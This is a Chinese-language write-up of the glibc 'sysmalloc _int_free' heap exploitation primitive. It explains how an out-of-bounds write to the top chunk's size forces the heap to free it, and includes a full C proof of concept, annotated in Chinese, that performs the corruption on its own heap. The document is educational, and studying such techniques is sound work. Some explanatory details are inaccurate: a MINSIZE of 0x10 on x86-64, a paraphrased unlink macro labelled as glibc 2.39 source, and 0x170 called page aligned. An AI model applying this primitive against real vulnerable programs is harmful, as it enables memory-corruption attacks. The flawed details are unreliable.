# 漏洞利用文档：sysmalloc_int_free 利用模式

## 攻击对象
- **目标内存位置**：top chunk（wilderness）的size字段。具体地址取决于堆布局，例如在调试记录中为0x603e98。
- **具体结构**：在glibc堆管理中，top chunk是堆的末尾chunk，其size字段控制剩余堆空间。通过修改size字段，可以触发sysmalloc中的_int_free调用。

## 利用过程
1. **初始分配**：通过malloc分配一个chunk（如PROBE和allocated_size），用于探测top chunk大小和提供溢出点。
2. **溢出修改**：利用堆溢出（OOB写）篡改top chunk的size字段，将其减小但仍保持页对齐（如从0x20171改为0x170）。
3. **触发sysmalloc**：分配一个大于篡改后top chunk大小的chunk（如0x160），触发sysmalloc进行堆增长。
4. **_int_free调用**：sysmalloc检测到top chunk无法合并，调用_int_free释放旧top chunk，将其放入unsorted bin。
5. **重新分配**：后续malloc可以从bin中分配被释放的chunk，实现内存重用。

## 利用条件
- **堆溢出写（OOB）**：程序存在缓冲区溢出或越界写漏洞，允许修改相邻chunk的元数据（如top chunk的size字段）。
- **可控分配大小**：攻击者能控制malloc分配的大小，以触发sysmalloc。
- **glibc版本**：适用于glibc 2.23及以上（测试于2.23），但机制在较新版本中可能被缓解。

## 利用效果
- **任意地址分配**：通过释放top chunk到bin，后续malloc可以分配到该chunk，实现可控的内存分配（但非绝对任意地址，而是相对堆布局）。
- **Use-After-Free (UAF)**：被释放的chunk可被重新分配和操作，导致UAF条件。
- **控制流劫持潜力**：如果结合其他漏洞（如写指针），可能劫持控制流，但本原型主要演示内存布局破坏。

## 涉及缓解机制
在glibc中，sysmalloc和_int_free包含元数据检查以防止滥用。关键代码片段来自glibc 2.39源码（[elixir.bootlin.com](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c)）：

- **sysmalloc中的size检查**（约L2913）：
  ```c
  if (old_size >= MINSIZE) {
    _int_free(av, old_top, 1); // 释放旧top chunk
  }
  ```
  这里，`old_size`必须至少为`MINSIZE`（通常0x10 on x86-64）且对齐，否则跳过释放。

- **_int_free中的unlink检查**（约L4400）：
  ```c
  #define unlink(AV, P, BK, FD) {
    // 检查chunk size是否一致
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))
      malloc_printerr ("corrupted size vs. prev_size");
    // 检查双向链表完整性
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
      malloc_printerr ("corrupted double-linked list");
  }
  ```
  在释放chunk时，unlink宏验证size和链表指针，防止简单腐败。

- **页对齐检查**：在sysmalloc中，top chunk size被要求页对齐（`aligned_OK`），否则可能崩溃。利用中通过`& PAGE_MASK`确保对齐。

在本利用中，攻击者通过溢出修改size为页对齐值（如0x170），绕过对齐检查，并确保size足够大以触发_int_free。

## Proof of Concept
以下是漏洞利用原型源码，添加了中文注释以解释关键步骤。

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
#define MALLOC_ALIGN (SIZE_SZ*2)
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost are offsets removed from the top before freeing
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// target top chunk size that should be freed
#define CHUNK_FREED_SIZE 0x150
#define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)

/**
 * Tested on:
 *  + GLIBC 2.23 (x86_64, x86 & aarch64)
 *
 * sysmalloc allows us to free() the top chunk of heap to create nearly arbitrary bins,
 * which can be used to corrupt heap without needing to call free() directly.
 * This is achieved through sysmalloc calling _int_free to the top_chunk (wilderness),
 * if the top_chunk can't be merged during heap growth
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * This technique is used in House of Orange & Tangerine
 */
int main() {
  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
  // disable buffering
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // check if all chunks sizes are aligned
  assert((CHUNK_FREED_SIZE & MALLOC_MASK) == CHUNK_FREED_SIZE);

  puts("Constants:");
  printf("chunk header \t\t= 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc align \t\t= 0x%lx\n", MALLOC_ALIGN);
  printf("page align \t\t= 0x%lx\n", PAGESIZE);
  printf("fencepost size \t\t= 0x%lx\n", FENCEPOST);
  printf("freed size \t\t= 0x%lx\n", FREED_SIZE);

  printf("target top chunk size \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);

  // 探测当前top chunk的大小，用于计算后续分配
  new = malloc(PROBE); // 分配一个小chunk来访问top chunk的size
  top_size = new[(PROBE / SIZE_SZ) + 1]; // 读取top chunk的size字段
  printf("first top size \t\t= 0x%lx\n", top_size);

  // 计算需要分配的大小，以使得溢出后能精确修改top size
  allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
  allocated_size &= PAGE_MASK; // 页对齐
  allocated_size &= MALLOC_MASK; // malloc对齐

  printf("allocated size \t\t= 0x%lx\n\n", allocated_size);

  puts("1. create initial malloc that will be used to corrupt the top_chunk (wilderness)");
  new = malloc(allocated_size); // 分配一个chunk，其末尾相邻top chunk

  // 获取top chunk size字段的指针，通过OOB写访问
  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- initial malloc\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|      SIZE (0x%05lx)   |\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         top_size - 1,
         top_size_ptr - 1 + (top_size / SIZE_SZ));

  puts("2. corrupt the size of top chunk to be less, but still page aligned");

  // 篡改top chunk的size，确保页对齐以绕过glibc检查
  new_top_size = top_size & PAGE_MASK; // 例如，0x20171 -> 0x170
  *top_size_ptr = new_top_size; // 通过溢出写修改size
  printf(""
         "----- %-14p ----\n"
         "|          NEW          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |   <- positive OOB (i.e. BOF)\n"
         "----- %-14p ----\n"
         "|         TOP           |   <- corrupt size of top chunk (wilderness)\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----   <- still page aligned\n"
         "|         ...           |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         new_top_size - 1,
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         top_size_ptr - 1 + (top_size / SIZE_SZ));


  puts("3. create an allocation larger than the remaining top chunk, to trigger heap growth");
  puts("The now corrupt top_chunk triggers sysmalloc to call _init_free on it");

  // 计算实际被释放的大小，考虑fencepost
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_FREED_SIZE); // 确保与目标一致

  old = new;
  new = malloc(CHUNK_FREED_SIZE + 0x10); // 分配大于篡改后top size的chunk，触发sysmalloc

  // 以下打印展示内存布局变化，被释放的chunk进入bin
  printf(""
         "----- %-14p ----\n"
         "|          OLD          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |\n"
         "----- %-14p ----\n"
         "|         FREED         |   <- old top got freed because it couldn't be merged\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----\n"
         "|       FENCEPOST       |   <- just some architecture depending padding\n"
         "----- %-14p ----   <- still page aligned\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          NEW          |   <- new malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n\n",
         old - 2,
         top_size_ptr - 1,
         freed_top_size,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE/SIZE_SZ),
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         new - (MALLOC_ALIGN / SIZE_SZ));

  puts("...\n");

  puts("?. reallocated into the freed chunk");

  // 重新分配到被释放的chunk，证明利用成功
  old = new;
  new = malloc(FREED_SIZE); // 分配大小匹配被释放chunk

  assert((size_t) old > (size_t) new); // 验证分配到较低地址（被释放区域）

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- allocated into the freed chunk\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          OLD          |   <- old malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n",
         new - 2,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE / SIZE_SZ),
         old - (MALLOC_ALIGN / SIZE_SZ));
}
```

**注释说明**：
- 代码通过溢出修改top chunk大小，触发glibc内部机制释放top chunk。
- 关键步骤包括：探测top size、计算分配大小、溢出写、触发sysmalloc、重新分配。
- 利用成功时，malloc分配到被释放的chunk，演示了无需显式free的UAF。